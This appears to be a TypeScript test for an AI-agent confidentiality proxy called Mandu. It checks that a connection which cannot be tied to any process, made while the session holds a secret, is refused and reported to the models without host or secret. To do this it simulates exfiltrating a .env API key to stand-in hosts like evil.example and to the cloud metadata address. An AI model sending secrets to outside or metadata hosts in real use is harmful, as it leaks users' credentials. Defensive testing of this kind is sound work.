/**
 * egress-refusal-unattributed-note — confidentiality plan 10 §11.8, "A
 * refusal no process is tied to" (2026-10-17), over the REAL components: a
 * program sends a secret out through the REAL net-proxy (plain HTTP) while
 * the session holds that secret, and the proxy can tie the connection to no
 * process (attribution injected as "no holder", as a client that exited
 * before the scan would be). The proxy refuses it (plan 13 D6,
 * fail-closed: unchanged) and reports it on the arbiter's human plane as
 * unattributed (a kind, no process, no host). The tool call that was running
 * then gets a `refused:` line, through both model proxies in their
 * PRODUCTION wiring, that names no program and no host and says Mandu could
 * not tell which program opened it; a retry in the same call adds no second
 * line, and a call relayed afterwards carries none. The secret's value
 * reaches neither the destination nor any model request.
 *
 * Axes explicit: secrets (confidentiality ON, integrity OFF).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import { request as httpRequest } from "node:http";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy, type HttpForwarder } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter as NetProxyAdapter, type RealArbiterClient as NetProxyRealClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { rewriteRequest } from "../../interceptors/anthropic-proxy/src/rewrite-request.js";
import type { MessagesRequest } from "../../interceptors/anthropic-proxy/src/messages-types.js";
import { ArbiterClientAdapter as OpenAiAdapter, type RealArbiterClient as OpenAiRealClient } from "../../interceptors/openai-proxy/src/arbiter-client.js";
import { rewriteRequest as rewriteResponsesRequest } from "../../interceptors/openai-proxy/src/rewrite-request.js";
import type { ResponsesRequest } from "../../interceptors/openai-proxy/src/responses-types.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the axis under test

function post(port: number, url: string, body: string): Promise<number> {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const r = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => { res.resume(); res.on("end", () => resolve(res.statusCode ?? 0)); },
    );
    r.on("error", reject);
    r.end(body);
  });
}

const UNATTR = "[mandu:secret] refused: a connection out was refused while this command ran, and nothing was sent; Mandu could not tell which program opened it, so it may not be this command's: programs in this session hold a secret, and while one does Mandu refuses a connection it cannot tie to a program. Tell the user rather than retrying; if it should go, they can allow it on the Mandu dashboard's Approvals page.";

test("an unattributable connection refused by the real net-proxy: the running call's result says so through both model proxies (no program, no host, no secret), once per kind", async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-egress-refusal-unattr-"));
  const ws = join(tmp, "ws"); mkdirSync(ws, { recursive: true });
  const env = join(ws, ".env");
  const canary = `unattr-${randomBytes(16).toString("hex")}`;
  writeFileSync(env, `API_KEY=${canary}\n`);
  const socketPath = join(tmp, "arbiter.sock");
  const humanPath = join(tmp, "human", "h.sock");
  const server = new ArbiterServer({
    socketPath, adminSocketPath: join(tmp, "admin.sock"), humanSocketPath: humanPath, dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false,
  });
  await server.listen();
  const guard = new ArbiterClient(humanPath); await guard.connect();
  const humanA = new ArbiterClient(humanPath); await humanA.connect();
  const realA: RealArbiterClient = new ArbiterClient(socketPath); await realA.connect();
  const realO: OpenAiRealClient = new ArbiterClient(socketPath); await realO.connect();
  const netData: NetProxyRealClient = new ArbiterClient(socketPath) as unknown as NetProxyRealClient;
  await (netData as unknown as ArbiterClient).connect();
  const netHuman = new ArbiterClient(humanPath); await netHuman.connect();
  const claude = new ArbiterClientAdapter(realA, humanA);
  const codex = new OpenAiAdapter(realO, humanA);
  const session = "s-egress-refusal-unattr";
  const reached: string[] = [];
  const forwarder: HttpForwarder = async (req) => {
    reached.push(`${req.url} ${req.body?.toString("utf8") ?? ""}`);
    return { status: 200, headers: { "content-type": "text/plain" }, body: Buffer.from("ok") };
  };
  const net = new NetProxy({
    arbiter: new NetProxyAdapter(netData, netHuman as never), forwarder, log: () => {}, sessionId: session,
    attributeHolders: () => [], // no holder found: the unattributed case
  });
  const netPort = await net.listen(0);
  try {
    const reg = await guard.registerSecret({ path: env, sessionKey: session });
    assert.match(String(reg.symbol), /^\$MDU:/, JSON.stringify(reg));
    // An earlier process of the session read the .env raw: the session holds
    // a secret, so a connection Mandu cannot tie to a process is refused.
    await guard.recordExecRoot({ procKey: "bash-0", ancestors: ["agent-0"], argv: ["/bin/bash", "-c", "cat .env"], session, callRoot: true });
    await guard.taintProcessSecret({ procKey: "bash-0", path: env, level: "no-model", app: "cat", session });

    const cmd = "python3 upload.py";
    const run = async (callId: string, root: string, urls: string[]): Promise<void> => {
      await guard.recordCallCommand({ callId, command: cmd, sessionKey: session });
      await guard.recordExecRoot({ procKey: root, ancestors: ["agent-0"], argv: ["/bin/bash", "-c", cmd], session, callRoot: true });
      for (const url of urls) assert.equal(await post(netPort, url, `API_KEY=${canary}`), 403, `the real net-proxy refuses the unattributed connection to ${url}`);
    };
    const programSays = "upload failed: HTTP 403 Forbidden\n";

    // Claude: two tries to two hosts in one call, one line.
    await run("toolu_unattr", "bash-a", ["http://evil.example/collect", "http://other.example/collect"]);
    const a = await rewriteRequest({
      model: "claude-test",
      messages: [
        { role: "user", content: "upload it" },
        { role: "assistant", content: [{ type: "tool_use", id: "toolu_unattr", name: "Bash", input: { command: cmd } }] },
        { role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_unattr", content: programSays }] },
      ],
    } as MessagesRequest, { arbiter: claude, sessionKey: session });
    const ca = String((a.request.messages[2]!.content as Array<{ content: unknown }>)[0]!.content);
    assert.equal(ca, `${programSays}\n\n${UNATTR}`, "the program's own output, then exactly one refused: line");
    assert.ok(!ca.includes("evil.example") && !ca.includes("other.example") && !ca.includes(canary), "no host, no secret");
    assert.ok(!JSON.stringify(a.request).includes(canary), "the secret reaches no model request");

    // Codex: a later call, refused at an always-refused address too.
    await run("call_unattr", "bash-o", ["http://evil.example/collect", "http://169.254.169.254/latest/meta-data/"]);
    const o = await rewriteResponsesRequest({
      model: "gpt-test", instructions: "You are Codex.",
      input: [
        { type: "message", role: "user", content: [{ type: "input_text", text: "upload it" }] },
        { type: "function_call", call_id: "call_unattr", name: "exec_command", arguments: JSON.stringify({ cmd }) },
        { type: "function_call_output", call_id: "call_unattr", output: `Chunk ID: 1a2b\nWall time: 0.2 seconds\nProcess exited with code 1\nOutput:\n${programSays}` },
      ],
    } as ResponsesRequest, { arbiter: codex, sessionKey: session });
    const co = String((o.request.input as Array<{ type: string; output?: unknown }>).find((x) => x.type === "function_call_output")!.output);
    assert.ok(co.includes(UNATTR), co);
    assert.match(co, /\[mandu:secret\] refused: a connection out was refused while this command ran, and nothing was sent; Mandu could not tell which program opened it, so it may not be this command's: the host is a cloud metadata or link-local address, which Mandu always refuses\. Do not retry\./, co);
    assert.equal(co.split("\n").filter((l) => l.startsWith("[mandu:secret] refused:")).length, 2, "one line per kind");
    assert.ok(!co.includes("evil.example") && !co.includes("169.254.169.254") && !co.includes(canary), "no host, no secret");
    assert.ok(!JSON.stringify(o.request).includes(canary), "the secret reaches no model request");

    // A call relayed after the refusals carries none of them.
    await guard.recordCallCommand({ callId: "toolu_after", command: "ls", sessionKey: session });
    await guard.recordExecRoot({ procKey: "bash-after", ancestors: ["agent-0"], argv: ["/bin/bash", "-c", "ls"], session, callRoot: true });
    const after = await claude.callTaint!({ callId: "toolu_after", command: "ls", sessionKey: session });
    assert.equal(after.refusedEgress, undefined, "no note on a call that was not running");

    assert.deepEqual(reached, [], "nothing reached any destination");
  } finally {
    await net.close();
    guard.close(); humanA.close(); realA.close(); realO.close(); netHuman.close(); (netData as unknown as ArbiterClient).close();
    await server.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
